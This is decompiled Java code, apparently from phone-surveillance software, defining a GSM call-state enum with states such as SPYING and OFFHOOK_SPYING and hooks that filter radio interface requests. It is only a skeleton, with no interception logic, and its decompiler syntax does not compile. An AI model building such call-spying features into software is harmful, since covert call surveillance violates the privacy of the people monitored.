package com.vvt.callmanager.filter;

import android.os.Parcel;
import java.util.Set;

public enum FilterGsmCall$CallState
{
  static Set sNotifiedList;
  protected FilterGsmCall mFilterCall;
  
  static
  {
    int i = 4;
    int j = 3;
    int k = 2;
    int m = 1;
    Object localObject = new com/vvt/callmanager/filter/FilterGsmCall$CallState$1;
    ((FilterGsmCall.CallState.1)localObject).<init>("IDLE", 0);
    IDLE = (CallState)localObject;
    localObject = new com/vvt/callmanager/filter/FilterGsmCall$CallState$2;
    ((FilterGsmCall.CallState.2)localObject).<init>("DIALING", m);
    DIALING = (CallState)localObject;
    localObject = new com/vvt/callmanager/filter/FilterGsmCall$CallState$3;
    ((FilterGsmCall.CallState.3)localObject).<init>("RINGING", k);
    RINGING = (CallState)localObject;
    localObject = new com/vvt/callmanager/filter/FilterGsmCall$CallState$4;
    ((FilterGsmCall.CallState.4)localObject).<init>("SPYING", j);
    SPYING = (CallState)localObject;
    localObject = new com/vvt/callmanager/filter/FilterGsmCall$CallState$5;
    ((FilterGsmCall.CallState.5)localObject).<init>("OFFHOOK", i);
    OFFHOOK = (CallState)localObject;
    localObject = new com/vvt/callmanager/filter/FilterGsmCall$CallState$6;
    ((FilterGsmCall.CallState.6)localObject).<init>("OFFHOOK_DIALING", 5);
    OFFHOOK_DIALING = (CallState)localObject;
    localObject = new com/vvt/callmanager/filter/FilterGsmCall$CallState$7;
    ((FilterGsmCall.CallState.7)localObject).<init>("OFFHOOK_RINGING", 6);
    OFFHOOK_RINGING = (CallState)localObject;
    localObject = new com/vvt/callmanager/filter/FilterGsmCall$CallState$8;
    ((FilterGsmCall.CallState.8)localObject).<init>("OFFHOOK_SPYING", 7);
    OFFHOOK_SPYING = (CallState)localObject;
    localObject = new CallState[8];
    CallState localCallState1 = IDLE;
    localObject[0] = localCallState1;
    localCallState1 = DIALING;
    localObject[m] = localCallState1;
    localCallState1 = RINGING;
    localObject[k] = localCallState1;
    localCallState1 = SPYING;
    localObject[j] = localCallState1;
    localCallState1 = OFFHOOK;
    localObject[i] = localCallState1;
    CallState localCallState2 = OFFHOOK_DIALING;
    localObject[5] = localCallState2;
    localCallState2 = OFFHOOK_RINGING;
    localObject[6] = localCallState2;
    localCallState2 = OFFHOOK_SPYING;
    localObject[7] = localCallState2;
    a = (CallState[])localObject;
  }
  
  public abstract void onEnter(Object paramObject);
  
  public abstract Object onExit();
  
  public abstract CallState processResponse(Parcel paramParcel);
  
  public abstract CallState processRilRequest(Parcel paramParcel);
  
  void setMessageFilter(FilterGsmCall paramFilterGsmCall)
  {
    this.mFilterCall = paramFilterGsmCall;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/callmgr/classes-enjarify.jar!/com/vvt/callmanager/filter/FilterGsmCall$CallState.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */